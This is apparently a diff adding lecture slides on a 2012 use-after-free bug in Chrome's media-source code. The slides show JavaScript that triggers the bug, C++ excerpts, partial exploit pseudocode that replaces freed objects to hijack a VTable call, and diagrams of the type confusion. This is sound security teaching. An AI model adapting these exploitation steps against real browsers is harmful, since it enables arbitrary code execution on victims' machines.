@@ -1,0 +1,143 @@
+\usetikzlibrary{calc,fit,matrix}
+\begin{frame}{real UAF exploitable bug}
+    \begin{itemize}
+        \item 2012 bug in Google Chrome
+        \item exploitable via JavaScript
+        \item discovered/proof of concept by PinkiePie
+        \item allowed arbitrary code execution via VTable manipulation
+    \end{itemize}
+\end{frame}
+
+
+\begin{frame}[fragile,label=UAFTriggering]{UAF triggering code}
+\lstset{
+    language=JavaScript,
+    style=smaller,
+    moredelim={**[is][\btHL<2|handout:0>]{~2~}{~end~}},
+    moredelim={**[is][\btHL<3-4|handout:0>]{~3~}{~end~}},
+    moredelim={**[is][\btHL<4|handout:0>]{~4~}{~end~}},
+}
+\begin{tikzpicture}
+\node[anchor=north east] (code) at (0, 0) {
+\begin{lstlisting}
+// in HTML near this JavaScript:
+// <video id="vid"> (video player element)
+function source_opened() {
+  buffer = ms.addSourceBuffer('video/webm; codecs="vorbis,vp8"');
+  ~2~vid.parentNode.removeChild(vid);~end~
+  gc(); // force garbage collector to run now
+  // garbage collector frees unreachable objects
+  // (would be run automatically, eventually, too)
+  // buffer now internally refers to delete'd player object
+  ~3~buffer.timestampOffset = 42;~end~
+}
+ms = new WebKitMediaSource();
+ms.addEventListener('webkitsourceopen', source_opened);
+vid.src = window.URL.createObjectURL(ms);
+\end{lstlisting}
+};
+    \begin{visibleenv}<4->
+        \node[fill=white,opacity=0.6,fit=(code)] {};
+        \node[draw=red,ultra thick,anchor=north east,fill=white,overlay] (cppCode) at (-.25, .125) { 
+\lstset{
+    language=C++,
+    style=smaller,
+    moredelim={**[is][\btHL<2|handout:0>]{~2~}{~end~}},
+    moredelim={**[is][\btHL<3-4|handout:0>]{~3~}{~end~}},
+    moredelim={**[is][\btHL<4|handout:0>]{~4~}{~end~}},
+    moredelim={**[is][\btHL<5|handout:0>]{~5~}{~end~}},
+}
+\begin{lstlisting}
+// implements JavaScript buffer.timestampOffset = 42
+void SourceBuffer::setTimestampOffset(...) {
+     if (m_source->setTimestampOffset(...))
+        ...
+}
+bool MediaSource::setTimestampOffset(...) {
+    // m_player was deleted when video player element deleted
+    // but this call does *not* use a VTable
+    if (!~4~m_player~end~->sourceSetTimestampOffset(id, offset)) 
+        ...
+}
+bool MediaPlayer::sourceSetTimestampOffset(...) {
+    // m_private deleted when MediaPlayer deleted
+    // this *is* a VTable-based call
+    return ~5~m_private~end~->sourceSetTimestampOffset(id, offset);
+}
+\end{lstlisting}
+    };
+    \end{visibleenv}
+\end{tikzpicture}
+\imagecredit{via \url{https://bugs.chromium.org/p/chromium/issues/detail?id=162835}}
+\end{frame}
+
+\begin{frame}[fragile,label=theExploit]{UAF exploit (approx. pseudocode)}
+\begin{lstlisting}[language=JavaScript,style=smaller]
+... /* use information leaks to find relevant addresses */ 
+buffer = ms.addSourceBuffer('video/webm; codecs="vorbis,vp8"');
+vid.parentNode.removeChild(vid);
+vid = null;
+gc();
+// allocate object to replace m_private
+var array = new Uint32Array(168/4);
+// allocate object to replace m_player
+// type chosen to keep m_private pointer unchanged
+rtc = new webkitRTCPeerConnection({'iceServers': []});
+array[0] = ... /* fill in array with chosen values */
+// trigger VTable Call that uses chosen address
+buffer.timestampOffset = 42;
+\end{lstlisting}
+\end{frame}
+
+\begin{frame}{type confusion}
+    \begin{tikzpicture}
+    \matrix[tight matrix,nodes={text width=6.8cm,text depth=.1ex,font=\small\tt},anchor=north west,
+            label={north:{\tt MediaPlayer} (deleted but used)}] (PlayerVT) at (0, 0) {
+        m\_private {\normalfont (pointer to PlayerImpl)} \\
+        m\_timestampOffset {\normalfont (double)} \\
+    };
+    \matrix[tight matrix,nodes={text width=6.8cm,text depth=.1ex,font=\small\tt},anchor=north west,
+            label={north:{\tt webkitRTC\ldots} (replacement)}] (SomethingVT) at (8, 0) {
+        (something not changed) \\
+        m\_??? {\normalfont (pointer)} \\
+        \ldots \\
+    };
+    \matrix[tight matrix,nodes={text width=6.8cm,text depth=.1ex,font=\small\tt},anchor=north west,
+            label={north:{\tt PlayerImpl} (deleted but used)}] (PlayerImplVT) at (0, -2) {
+        VTable pointer \\
+        \ldots \\
+    };
+    \matrix[tight matrix,nodes={text width=6.8cm,text depth=.1ex,font=\small\tt},anchor=north west,
+            label={north:array of 32-bit ints (replacement)}] (ArrayVT) at (8, -2) {
+        array[0], array[1] \\
+        array[2], array[3] \\
+        \ldots \\
+    };
+    \end{tikzpicture}
+\end{frame}
+
+\begin{frame}{missing pieces: information disclosure}
+    \begin{itemize}
+        \item need to learn address to set VTable pointer to
+            \begin{itemize}
+            \item (and other addresses to use)
+            \end{itemize}
+        \item allocate types other than \texttt{Uint32Array}
+        \item rely on confusing between different types, e.g.
+    \end{itemize}
+    \begin{tikzpicture}
+    \matrix[tight matrix,nodes={text width=6.8cm,text depth=.1ex,font=\small\tt},anchor=north west,
+            label={north:{\tt MediaPlayer} (deleted but used)}] (PlayerVT) at (0, 0) {
+        m\_private {\normalfont (pointer to PlayerImpl)} \\
+        m\_timestampOffset {\normalfont (double)} \\
+    };
+    \matrix[tight matrix,nodes={text width=6.8cm,text depth=.1ex,font=\small\tt},anchor=north west,
+            label={north:{\tt Something} (replacement)}] (SomethingVT) at (8, 0) {
+        \ldots \\
+        m\_buffer {\normalfont (pointer)} \\
+    };
+    \end{tikzpicture}
+    \begin{itemize}
+    \item allows reading timestamp value to get a pointer's address
+    \end{itemize}
+\end{frame}
